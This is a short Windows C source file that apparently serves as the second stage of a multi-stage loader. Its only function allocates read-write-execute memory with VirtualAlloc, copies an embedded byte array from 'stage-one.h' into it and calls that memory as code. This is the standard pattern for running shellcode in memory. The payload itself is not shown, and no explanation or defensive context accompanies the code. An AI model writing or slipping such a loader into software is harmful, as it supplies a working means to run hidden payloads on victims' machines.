#include "stage-one.h"
#include <windows.h>

void __stage_two() {
    void* exec = VirtualAlloc(0, sizeof(__stage_one__), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, __stage_one__, sizeof(__stage_one__));
    ((void(*)())exec)(); 
}